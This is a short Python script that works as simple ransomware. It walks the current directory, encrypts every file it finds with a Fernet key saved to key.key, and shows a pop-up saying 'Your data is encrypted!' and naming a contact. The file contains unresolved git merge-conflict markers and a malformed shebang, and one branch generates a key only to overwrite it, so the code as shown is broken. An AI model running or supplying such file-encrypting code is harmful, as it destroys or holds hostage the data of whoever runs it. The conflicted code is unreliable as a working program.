# !usr/bin/env python3

import os

<<<<<<< HEAD
from cryptography.fernet import Fernet
=======
from cryptography.fernet import Fernet, InvalidToken
>>>>>>> 85c47c2 (Initial commit - prevent double encryption)

import tkinter as tk
from tkinter import messagebox

All_files = []

for root, dirs, files in os.walk("."):
    for file in files:
        path = os.path.join(root,file)
<<<<<<< HEAD
=======
        dirs[:] = [d for d in dirs if d != ".git"]
>>>>>>> 85c47c2 (Initial commit - prevent double encryption)
        
        if path == "./encrypting.py" or path == "./key.key" or path == "./decrypting.py":
            continue
        All_files.append(path)

<<<<<<< HEAD

key = Fernet.generate_key()



with open("key.key", "wb") as thekey:
    thekey.write(key)

for file in All_files:
    with open(file, "rb") as thefile:
        content = thefile.read()
    
    content_encrypted = Fernet(key).encrypt(content)

    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)
=======
print(All_files)

key = Fernet.generate_key()

with open("key.key", "rb") as f:
    key = f.read()

with open("hello.txt", "rb") as f:
    content = f.read()

try:
    Fernet(key).decrypt(content)
    print("Already Fernet encrypted with this key")
except InvalidToken:
    
    with open("key.key", "wb") as thekey:
        thekey.write(key)

    for file in All_files:
        with open(file, "rb") as thefile:
            content = thefile.read()

        content_encrypted = Fernet(key).encrypt(content)

        with open(file, "wb") as thefile:
            thefile.write(content_encrypted)


>>>>>>> 85c47c2 (Initial commit - prevent double encryption)

root = tk.Tk()
root.withdraw()

messagebox.showinfo("Your data is encrypted!", "contact Yunchae!")